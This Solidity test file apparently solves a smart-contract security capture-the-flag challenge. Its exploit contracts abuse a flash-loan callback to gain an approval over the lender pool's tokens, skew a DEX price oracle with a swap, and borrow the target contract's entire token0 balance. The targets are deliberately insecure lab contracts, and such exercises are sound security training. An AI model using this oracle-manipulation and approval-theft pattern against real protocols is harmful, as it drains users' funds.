// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";

contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));

        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0), address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(
            address(oracleDex),
            address(token0),
            address(token1)
        );

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");
    }

    function testChallenge3() public {
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/
        ExploitLenderPool expLP = new ExploitLenderPool();

        Exploit exp = new Exploit(
            player,
            token0,
            token1,
            target,
            oracleDex,
            flashLoanPool,
            expLP
        );

        exp.hack();

        //============================//

        vm.stopPrank();

        assertEq(
            token0.balanceOf(address(target)),
            0,
            "You should empty the target contract"
        );
    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;
    InSecureumLenderPool lenderPool;
    ExploitLenderPool expLP;
    address player;

    constructor(
        address _player,
        IERC20 _token0,
        IERC20 _token1,
        BorrowSystemInsecureOracle _borrowSystem,
        InsecureDexLP _dex,
        InSecureumLenderPool _lenderPool,
        ExploitLenderPool _expLP
    ) {
        token0 = _token0;
        token1 = _token1;
        borrowSystem = _borrowSystem;
        dex = _dex;
        lenderPool = _lenderPool;
        expLP = _expLP;
        player = _player;
    }

    function hack() public {
        stealFromLenderPool();
        swap();
        stealFromBorrowSystem();
        withdraw();
    }

    function swap() internal {
        uint256 balance = token0.balanceOf(address(this));
        token0.approve(address(dex), balance);
        dex.swap(address(token0), address(token1), balance);
    }

    function stealFromBorrowSystem() internal {
        uint256 balance = token1.balanceOf(address(this));
        token1.approve(address(borrowSystem), balance);

        borrowSystem.depositToken1(balance);
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
    }

    function withdraw() internal {
        token0.transfer(player, token0.balanceOf(address(this)));
    }

    function stealFromLenderPool() internal {
        lenderPool.flashLoan(address(expLP), abi.encodeWithSignature("Hack()"));
        token0.transferFrom(
            address(lenderPool),
            address(this),
            token0.balanceOf(address(lenderPool))
        );
    }
}

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract ExploitLenderPool {
    using Address for address;
    using SafeERC20 for IERC20;
    IERC20 public token;

    function Hack() public {
        token.approve(msg.sender, token.balanceOf(address(this)));
    }
}
